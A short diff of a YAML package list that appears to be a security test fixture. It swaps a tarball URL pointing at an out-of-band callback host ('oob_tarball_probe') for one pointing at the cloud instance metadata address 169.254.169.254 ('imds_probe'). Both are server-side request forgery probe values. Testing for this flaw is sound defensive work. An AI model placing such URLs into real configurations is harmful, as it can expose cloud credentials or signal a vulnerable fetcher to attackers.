@@ -1,3 +1,3 @@
 packages:
-  - tarball: "http://plainhttp.db7t14d07i5e1ro136kgbw58mcjoreyqi.oast.fun/pkg.tar.gz"
-    name: "oob_tarball_probe"
+  - tarball: "http://169.254.169.254/latest/meta-data/"
+    name: "imds_probe"
